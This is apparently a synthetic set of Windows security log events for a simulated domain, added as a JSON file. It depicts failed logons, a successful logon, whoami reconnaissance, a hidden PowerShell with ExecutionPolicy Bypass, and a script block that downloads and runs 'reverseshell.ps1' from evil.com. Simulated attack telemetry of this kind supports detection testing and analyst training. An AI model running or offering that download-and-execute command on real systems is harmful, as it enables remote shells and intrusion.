@@ -1,0 +1,481 @@
+[
+    {
+        "id": "b8735b14-4072-41b1-8ba1-c459b6fdee16",
+        "timestamp": "2026-07-05T11:50:05.874691Z",
+        "host": {
+            "hostname": "win-dc-01",
+            "ip": [
+                "10.0.20.10"
+            ],
+            "id": "host-win-dc-01",
+            "os_family": "windows",
+            "os_name": "Windows Server 2022 Datacenter",
+            "architecture": "x64"
+        },
+        "user": {
+            "name": "hpotter",
+            "id": "user-hpotter",
+            "domain": "corp.sentinel.sim",
+            "roles": [
+                "Marketing Coordinator"
+            ],
+            "email": "hpotter@corp.sentinel.sim"
+        },
+        "process": null,
+        "network": null,
+        "file": null,
+        "event_category": "iam",
+        "event_type": "authentication_failure",
+        "log_source": "windows_event_security",
+        "raw_log": "An account failed to log on. Subject: Security ID: S-1-5-18 Account Name: SYSTEM Account Domain: NT AUTHORITY.  Failure Information: Reason: Unknown user name or bad password. Status: 0xC000006D. Sub Status: 0xC0000064.",
+        "custom_fields": {
+            "winlog_event_id": 4625
+        }
+    },
+    {
+        "id": "eb392ea7-7bce-48f0-a460-b10d1ad78528",
+        "timestamp": "2026-07-05T11:50:06.801287Z",
+        "host": {
+            "hostname": "win-dc-01",
+            "ip": [
+                "10.0.20.10"
+            ],
+            "id": "host-win-dc-01",
+            "os_family": "windows",
+            "os_name": "Windows Server 2022 Datacenter",
+            "architecture": "x64"
+        },
+        "user": {
+            "name": "hpotter",
+            "id": "user-hpotter",
+            "domain": "corp.sentinel.sim",
+            "roles": [
+                "Marketing Coordinator"
+            ],
+            "email": "hpotter@corp.sentinel.sim"
+        },
+        "process": null,
+        "network": null,
+        "file": null,
+        "event_category": "iam",
+        "event_type": "authentication_failure",
+        "log_source": "windows_event_security",
+        "raw_log": "An account failed to log on. Subject: Security ID: S-1-5-18 Account Name: SYSTEM Account Domain: NT AUTHORITY.  Failure Information: Reason: Unknown user name or bad password. Status: 0xC000006D. Sub Status: 0xC0000064.",
+        "custom_fields": {
+            "winlog_event_id": 4625
+        }
+    },
+    {
+        "id": "c22467c3-2b70-4a6c-aa6e-42c29d454186",
+        "timestamp": "2026-07-05T11:50:08.128833Z",
+        "host": {
+            "hostname": "win-dc-01",
+            "ip": [
+                "10.0.20.10"
+            ],
+            "id": "host-win-dc-01",
+            "os_family": "windows",
+            "os_name": "Windows Server 2022 Datacenter",
+            "architecture": "x64"
+        },
+        "user": {
+            "name": "hpotter",
+            "id": "user-hpotter",
+            "domain": "corp.sentinel.sim",
+            "roles": [
+                "Marketing Coordinator"
+            ],
+            "email": "hpotter@corp.sentinel.sim"
+        },
+        "process": null,
+        "network": null,
+        "file": null,
+        "event_category": "iam",
+        "event_type": "authentication_failure",
+        "log_source": "windows_event_security",
+        "raw_log": "An account failed to log on. Subject: Security ID: S-1-5-18 Account Name: SYSTEM Account Domain: NT AUTHORITY.  Failure Information: Reason: Unknown user name or bad password. Status: 0xC000006D. Sub Status: 0xC0000064.",
+        "custom_fields": {
+            "winlog_event_id": 4625
+        }
+    },
+    {
+        "id": "868f37ff-0d98-4ff0-b2a1-87104a25480f",
+        "timestamp": "2026-07-05T11:50:10.634269Z",
+        "host": {
+            "hostname": "win-dc-01",
+            "ip": [
+                "10.0.20.10"
+            ],
+            "id": "host-win-dc-01",
+            "os_family": "windows",
+            "os_name": "Windows Server 2022 Datacenter",
+            "architecture": "x64"
+        },
+        "user": {
+            "name": "hpotter",
+            "id": "user-hpotter",
+            "domain": "corp.sentinel.sim",
+            "roles": [
+                "Marketing Coordinator"
+            ],
+            "email": "hpotter@corp.sentinel.sim"
+        },
+        "process": null,
+        "network": null,
+        "file": null,
+        "event_category": "iam",
+        "event_type": "authentication_failure",
+        "log_source": "windows_event_security",
+        "raw_log": "An account failed to log on. Subject: Security ID: S-1-5-18 Account Name: SYSTEM Account Domain: NT AUTHORITY.  Failure Information: Reason: Unknown user name or bad password. Status: 0xC000006D. Sub Status: 0xC0000064.",
+        "custom_fields": {
+            "winlog_event_id": 4625
+        }
+    },
+    {
+        "id": "4b93fd37-5c1f-4ad6-9265-3c8f257e17b3",
+        "timestamp": "2026-07-05T11:50:13.724297Z",
+        "host": {
+            "hostname": "win-dc-01",
+            "ip": [
+                "10.0.20.10"
+            ],
+            "id": "host-win-dc-01",
+            "os_family": "windows",
+            "os_name": "Windows Server 2022 Datacenter",
+            "architecture": "x64"
+        },
+        "user": {
+            "name": "hpotter",
+            "id": "user-hpotter",
+            "domain": "corp.sentinel.sim",
+            "roles": [
+                "Marketing Coordinator"
+            ],
+            "email": "hpotter@corp.sentinel.sim"
+        },
+        "process": null,
+        "network": null,
+        "file": null,
+        "event_category": "iam",
+        "event_type": "authentication_failure",
+        "log_source": "windows_event_security",
+        "raw_log": "An account failed to log on. Subject: Security ID: S-1-5-18 Account Name: SYSTEM Account Domain: NT AUTHORITY.  Failure Information: Reason: Unknown user name or bad password. Status: 0xC000006D. Sub Status: 0xC0000064.",
+        "custom_fields": {
+            "winlog_event_id": 4625
+        }
+    },
+    {
+        "id": "b1468f7c-a764-4ff6-ab90-09655d508395",
+        "timestamp": "2026-07-05T11:50:16.791011Z",
+        "host": {
+            "hostname": "win-dc-01",
+            "ip": [
+                "10.0.20.10"
+            ],
+            "id": "host-win-dc-01",
+            "os_family": "windows",
+            "os_name": "Windows Server 2022 Datacenter",
+            "architecture": "x64"
+        },
+        "user": {
+            "name": "hpotter",
+            "id": "user-hpotter",
+            "domain": "corp.sentinel.sim",
+            "roles": [
+                "Marketing Coordinator"
+            ],
+            "email": "hpotter@corp.sentinel.sim"
+        },
+        "process": null,
+        "network": null,
+        "file": null,
+        "event_category": "iam",
+        "event_type": "authentication_failure",
+        "log_source": "windows_event_security",
+        "raw_log": "An account failed to log on. Subject: Security ID: S-1-5-18 Account Name: SYSTEM Account Domain: NT AUTHORITY.  Failure Information: Reason: Unknown user name or bad password. Status: 0xC000006D. Sub Status: 0xC0000064.",
+        "custom_fields": {
+            "winlog_event_id": 4625
+        }
+    },
+    {
+        "id": "a93023fa-6762-456e-957a-554b7f208651",
+        "timestamp": "2026-07-05T11:50:19.149718Z",
+        "host": {
+            "hostname": "win-dc-01",
+            "ip": [
+                "10.0.20.10"
+            ],
+            "id": "host-win-dc-01",
+            "os_family": "windows",
+            "os_name": "Windows Server 2022 Datacenter",
+            "architecture": "x64"
+        },
+        "user": {
+            "name": "hpotter",
+            "id": "user-hpotter",
+            "domain": "corp.sentinel.sim",
+            "roles": [
+                "Marketing Coordinator"
+            ],
+            "email": "hpotter@corp.sentinel.sim"
+        },
+        "process": null,
+        "network": null,
+        "file": null,
+        "event_category": "iam",
+        "event_type": "authentication_failure",
+        "log_source": "windows_event_security",
+        "raw_log": "An account failed to log on. Subject: Security ID: S-1-5-18 Account Name: SYSTEM Account Domain: NT AUTHORITY.  Failure Information: Reason: Unknown user name or bad password. Status: 0xC000006D. Sub Status: 0xC0000064.",
+        "custom_fields": {
+            "winlog_event_id": 4625
+        }
+    },
+    {
+        "id": "ebf30a42-4e14-4825-9e1c-b549ace1d163",
+        "timestamp": "2026-07-05T11:50:20.102292Z",
+        "host": {
+            "hostname": "win-dc-01",
+            "ip": [
+                "10.0.20.10"
+            ],
+            "id": "host-win-dc-01",
+            "os_family": "windows",
+            "os_name": "Windows Server 2022 Datacenter",
+            "architecture": "x64"
+        },
+        "user": {
+            "name": "hpotter",
+            "id": "user-hpotter",
+            "domain": "corp.sentinel.sim",
+            "roles": [
+                "Marketing Coordinator"
+            ],
+            "email": "hpotter@corp.sentinel.sim"
+        },
+        "process": null,
+        "network": null,
+        "file": null,
+        "event_category": "iam",
+        "event_type": "authentication_failure",
+        "log_source": "windows_event_security",
+        "raw_log": "An account failed to log on. Subject: Security ID: S-1-5-18 Account Name: SYSTEM Account Domain: NT AUTHORITY.  Failure Information: Reason: Unknown user name or bad password. Status: 0xC000006D. Sub Status: 0xC0000064.",
+        "custom_fields": {
+            "winlog_event_id": 4625
+        }
+    },
+    {
+        "id": "57cb03ea-12f4-4547-af4e-7527babd33b8",
+        "timestamp": "2026-07-05T11:50:21.969265Z",
+        "host": {
+            "hostname": "win-dc-01",
+            "ip": [
+                "10.0.20.10"
+            ],
+            "id": "host-win-dc-01",
+            "os_family": "windows",
+            "os_name": "Windows Server 2022 Datacenter",
+            "architecture": "x64"
+        },
+        "user": {
+            "name": "hpotter",
+            "id": "user-hpotter",
+            "domain": "corp.sentinel.sim",
+            "roles": [
+                "Marketing Coordinator"
+            ],
+            "email": "hpotter@corp.sentinel.sim"
+        },
+        "process": null,
+        "network": null,
+        "file": null,
+        "event_category": "iam",
+        "event_type": "authentication_failure",
+        "log_source": "windows_event_security",
+        "raw_log": "An account failed to log on. Subject: Security ID: S-1-5-18 Account Name: SYSTEM Account Domain: NT AUTHORITY.  Failure Information: Reason: Unknown user name or bad password. Status: 0xC000006D. Sub Status: 0xC0000064.",
+        "custom_fields": {
+            "winlog_event_id": 4625
+        }
+    },
+    {
+        "id": "cc249ce2-4fe7-4284-9f19-e2b13667cd72",
+        "timestamp": "2026-07-05T11:50:23.829918Z",
+        "host": {
+            "hostname": "win-dc-01",
+            "ip": [
+                "10.0.20.10"
+            ],
+            "id": "host-win-dc-01",
+            "os_family": "windows",
+            "os_name": "Windows Server 2022 Datacenter",
+            "architecture": "x64"
+        },
+        "user": {
+            "name": "hpotter",
+            "id": "user-hpotter",
+            "domain": "corp.sentinel.sim",
+            "roles": [
+                "Marketing Coordinator"
+            ],
+            "email": "hpotter@corp.sentinel.sim"
+        },
+        "process": null,
+        "network": null,
+        "file": null,
+        "event_category": "iam",
+        "event_type": "authentication_failure",
+        "log_source": "windows_event_security",
+        "raw_log": "An account failed to log on. Subject: Security ID: S-1-5-18 Account Name: SYSTEM Account Domain: NT AUTHORITY.  Failure Information: Reason: Unknown user name or bad password. Status: 0xC000006D. Sub Status: 0xC0000064.",
+        "custom_fields": {
+            "winlog_event_id": 4625
+        }
+    },
+    {
+        "id": "64150583-a3e8-42ad-819f-0f4323ee69c8",
+        "timestamp": "2026-07-05T11:50:30.029065Z",
+        "host": {
+            "hostname": "win-dc-01",
+            "ip": [
+                "10.0.20.10"
+            ],
+            "id": "host-win-dc-01",
+            "os_family": "windows",
+            "os_name": "Windows Server 2022 Datacenter",
+            "architecture": "x64"
+        },
+        "user": {
+            "name": "hpotter",
+            "id": "user-hpotter",
+            "domain": "corp.sentinel.sim",
+            "roles": [
+                "Marketing Coordinator"
+            ],
+            "email": "hpotter@corp.sentinel.sim"
+        },
+        "process": null,
+        "network": null,
+        "file": null,
+        "event_category": "iam",
+        "event_type": "authentication_success",
+        "log_source": "windows_event_security",
+        "raw_log": "An account was successfully logged on. Subject: Security ID: S-1-5-18 Account Name: SYSTEM Account Domain: NT AUTHORITY.  Target: User: hpotter Domain: corp.sentinel.sim. Logon Type: 3. Logon ID: 0x815ef6d1",
+        "custom_fields": {
+            "winlog_event_id": 4624,
+            "logon_type": 3
+        }
+    },
+    {
+        "id": "8ac6ed94-cea0-4d66-a1a9-a4117d1e19b2",
+        "timestamp": "2026-07-05T11:50:42.136979Z",
+        "host": {
+            "hostname": "win-dc-01",
+            "ip": [
+                "10.0.20.10"
+            ],
+            "id": "host-win-dc-01",
+            "os_family": "windows",
+            "os_name": "Windows Server 2022 Datacenter",
+            "architecture": "x64"
+        },
+        "user": {
+            "name": "hpotter",
+            "id": "user-hpotter",
+            "domain": "corp.sentinel.sim",
+            "roles": [
+                "Marketing Coordinator"
+            ],
+            "email": "hpotter@corp.sentinel.sim"
+        },
+        "process": {
+            "pid": 9928,
+            "name": "cmd.exe",
+            "executable": "C:\\Windows\\System32\\cmd.exe",
+            "command_line": "C:\\Windows\\System32\\cmd.exe /c whoami",
+            "parent_pid": null,
+            "parent_name": null,
+            "hash_sha256": null
+        },
+        "network": null,
+        "file": null,
+        "event_category": "process",
+        "event_type": "creation",
+        "log_source": "windows_event_security",
+        "raw_log": "A new process has been created. Creator: User: hpotter. New Process Name: C:\\Windows\\System32\\cmd.exe Command Line: C:\\Windows\\System32\\cmd.exe /c whoami Process ID: 0x26c8",
+        "custom_fields": {
+            "winlog_event_id": 4688
+        }
+    },
+    {
+        "id": "a3428551-184c-4649-92c1-fad616637119",
+        "timestamp": "2026-07-05T11:50:55.400944Z",
+        "host": {
+            "hostname": "win-dc-01",
+            "ip": [
+                "10.0.20.10"
+            ],
+            "id": "host-win-dc-01",
+            "os_family": "windows",
+            "os_name": "Windows Server 2022 Datacenter",
+            "architecture": "x64"
+        },
+        "user": {
+            "name": "hpotter",
+            "id": "user-hpotter",
+            "domain": "corp.sentinel.sim",
+            "roles": [
+                "Marketing Coordinator"
+            ],
+            "email": "hpotter@corp.sentinel.sim"
+        },
+        "process": {
+            "pid": 8359,
+            "name": "powershell.exe",
+            "executable": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
+            "command_line": "powershell.exe -ExecutionPolicy Bypass -WindowStyle Hidden",
+            "parent_pid": null,
+            "parent_name": null,
+            "hash_sha256": null
+        },
+        "network": null,
+        "file": null,
+        "event_category": "process",
+        "event_type": "creation",
+        "log_source": "windows_event_security",
+        "raw_log": "A new process has been created. Creator: User: hpotter. New Process Name: C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe Command Line: powershell.exe -ExecutionPolicy Bypass -WindowStyle Hidden Process ID: 0x20a7",
+        "custom_fields": {
+            "winlog_event_id": 4688
+        }
+    },
+    {
+        "id": "89d09afa-61cd-4231-9afd-48b159de2b5f",
+        "timestamp": "2026-07-05T11:50:56.861381Z",
+        "host": {
+            "hostname": "win-dc-01",
+            "ip": [
+                "10.0.20.10"
+            ],
+            "id": "host-win-dc-01",
+            "os_family": "windows",
+            "os_name": "Windows Server 2022 Datacenter",
+            "architecture": "x64"
+        },
+        "user": {
+            "name": "hpotter",
+            "id": "user-hpotter",
+            "domain": "corp.sentinel.sim",
+            "roles": [
+                "Marketing Coordinator"
+            ],
+            "email": "hpotter@corp.sentinel.sim"
+        },
+        "process": null,
+        "network": null,
+        "file": null,
+        "event_category": "process",
+        "event_type": "script_execution",
+        "log_source": "powershell",
+        "raw_log": "Creating Scriptblock text (1 of 1):\nIEX (New-Object Net.WebClient).DownloadString('http://evil.com/reverseshell.ps1')\nScriptBlock ID: dcab406f-c524-4e81-80a0-12a0127b3fbd Path: C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
+        "custom_fields": {
+            "winlog_event_id": 4104
+        }
+    }
+]
